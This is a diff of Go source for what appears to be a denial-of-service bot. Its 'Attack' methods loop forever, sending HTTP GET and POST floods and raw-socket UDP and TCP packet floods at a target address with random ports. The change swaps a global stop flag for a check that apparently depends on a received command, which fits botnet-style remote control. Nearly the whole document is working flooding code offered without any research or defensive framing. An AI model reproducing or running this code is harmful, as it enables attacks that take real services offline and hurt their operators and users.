@@ -99,12 +99,16 @@ func (a *Attack) getRequest() {
 		for agent := range httpAgent {
 			usrAgent.Header.Set("User-Agent", httpAgent[agent])
 			get.Do(usrAgent)
-			if AttackSwitch {
-				break
+			if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+				if callSwitch.CallAttack.attackSwitch {
+					break
+				}
 			}
 		}
-		if AttackSwitch {
-			break
+		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch.CallAttack.attackSwitch {
+				break
+			}
 		}
 	}
 }
@@ -113,8 +117,10 @@ func (a *Attack) postRequest() {
 	post, postBody := a.setupHTTP()
 	for {
 		post.Do(postBody)
-		if AttackSwitch {
-			break
+		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch.CallAttack.attackSwitch {
+				break
+			}
 		}
 	}
 }
@@ -123,14 +129,14 @@ func (a *Attack) udpPacket() {
 	conn := rawSocket(syscall.IPPROTO_UDP)
 	for {
 		/*
-			setup UDP dst.
+			Setup UDP dst.
 		*/
 		dst := &net.UDPAddr{
 			IP:   net.ParseIP(a.dstAddr),
 			Port: a.randDstPort(),
 		}
 		/*
-			setup UDP src.
+			Setup UDP src.
 		*/
 		udp := a.setupUDP(
 			&net.UDPAddr{
@@ -138,15 +144,17 @@ func (a *Attack) udpPacket() {
 				Port: rand.Intn(65535),
 			}, dst)
 		/*
-			send UDP packet.
+			Send UDP packet.
 		*/
 		conn.WriteTo(udp,
 			&net.IPAddr{
 				IP: dst.IP,
 			},
 		)
-		if AttackSwitch {
-			break
+		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch.CallAttack.attackSwitch {
+				break
+			}
 		}
 	}
 }
@@ -155,14 +163,14 @@ func (a *Attack) tcpPacket() {
 	conn := rawSocket(syscall.IPPROTO_TCP)
 	for {
 		/*
-			setup TCP dst.
+			Setup TCP dst.
 		*/
 		dst := &net.TCPAddr{
 			IP:   net.ParseIP(a.dstAddr),
 			Port: a.randDstPort(),
 		}
 		/*
-			setup TCP src.
+			Setup TCP src.
 		*/
 		tcp := a.setupTCP(
 			&net.TCPAddr{
@@ -170,15 +178,17 @@ func (a *Attack) tcpPacket() {
 				Port: rand.Intn(65535),
 			}, dst)
 		/*
-			send TCP packet.
+			Send TCP packet.
 		*/
 		conn.WriteTo(tcp,
 			&net.IPAddr{
 				IP: dst.IP,
 			},
 		)
-		if AttackSwitch {
-			break
+		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch.CallAttack.attackSwitch {
+				break
+			}
 		}
 	}
 }
